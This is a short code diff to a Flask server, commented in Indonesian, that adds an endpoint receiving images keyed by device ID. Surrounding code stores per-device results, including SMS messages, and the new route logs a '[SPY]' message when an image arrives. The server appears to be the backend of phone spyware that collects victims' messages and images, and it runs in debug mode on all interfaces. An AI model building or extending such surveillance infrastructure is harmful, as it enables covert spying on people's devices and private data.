@@ -89,6 +89,28 @@ def clear_result(device_id, result_type):
         elif result_type == "sms":
             latest_results[device_id]["sms"] = []
     return jsonify({"status": "success"})
+import os
+from werkzeug.utils import secure_filename
+from flask import send_from_directory
 
+# Bikin folder uploads kalau belum ada
+UPLOAD_FOLDER = 'static/uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+@app.route('/api/upload_image/<device_id>', methods=['POST'])
+def upload_image(device_id):
+    if 'image' not in request.files:
+        return jsonify({"status": "error", "message": "No image part"}), 400
+    
+    file = request.files['image']
+    if file.filename == '':
+        return jsonify({"status": "error", "message": "No selected file"}), 400
+    
+    # Simpan sebagai latest.jpg (nimpa file lama biar hemat storage)
+    filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
+    file.save(filepath)
+    print(f"[SPY] Gambar baru diterima dari {device_id}!")
+    
+    return jsonify({"status": "success"})
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
